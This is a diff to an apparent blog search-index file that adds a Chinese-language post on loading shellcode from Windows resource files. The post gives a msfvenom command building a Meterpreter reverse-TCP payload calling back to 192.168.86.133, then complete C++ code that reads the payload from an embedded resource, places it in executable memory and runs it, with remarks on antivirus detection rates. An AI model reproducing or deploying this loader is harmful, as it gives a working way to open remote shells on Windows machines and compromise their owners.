@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>通过资源文件加载Shellcode</title>
+      <link href="2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/"/>
+      <url>2020/12/25/%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BDShellcode/</url>
+      
+        <content type="html"><![CDATA[<h3 id="0x01-生成Shellcode"><a href="#0x01-生成Shellcode" class="headerlink" title="0x01 生成Shellcode"></a>0x01 生成Shellcode</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=12345 &gt;payload.bin</code></pre><h3 id="0x02-添加资源文件"><a href="#0x02-添加资源文件" class="headerlink" title="0x02 添加资源文件"></a>0x02 添加资源文件</h3><p>右键<code>资源文件&gt;添加&gt;资源</code>添加我们刚刚生成的Shellcode</p><p><img src="image-20201225140005634.png" alt="image-20201225140005634"></p><p>选择<code>导入</code>，添加<code>payload.bin</code></p><p><img src="image-20201225140229778.png" alt="image-20201225140229778"></p><p><img src="image-20201225140458518.png" alt="image-20201225140458518"></p><p>我们可以在资源文件中看到我们的bin文件已经被加载</p><p><img src="image-20201225140603313.png" alt="image-20201225140603313"></p><p>代码：</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;resource.h&quot;int main()&#123;    // IDR_METERPRETER_BIN1 - is the resource ID - which contains ths shellcode    // METERPRETER_BIN is the resource type name we chose earlier when embedding the meterpreter.bin    HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_PAYLOAD_BIN1), L&quot;PAYLOAD_BIN&quot;);    DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);    HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);    void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    memcpy(exec, shellcodeResouceData, shellcodeSize);    ((void(*)())exec)();    return  0;&#125;</code></pre><h3 id="0x03-编译和验证"><a href="#0x03-编译和验证" class="headerlink" title="0x03 编译和验证"></a>0x03 编译和验证</h3><p>编译成功没有什么问题</p><p><img src="image-20201225141139791.png" alt="image-20201225141139791"></p><p>生成的exe放到虚拟机里运行一下，成功</p><p><img src="image-20201225141256996.png" alt="image-20201225141256996"></p><p>免杀率……将就吧，毕竟并没有做什么免杀的措施，只是一种加载shellcode的技巧而已</p><p><img src="image-20201225141643919.png" alt="image-20201225141643919"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>避开Windows API执行Shellcode</title>
       <link href="2020/09/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/"/>
       <url>2020/09/25/%E9%81%BF%E5%BC%80Windows-API%E6%89%A7%E8%A1%8CShellcode/</url>
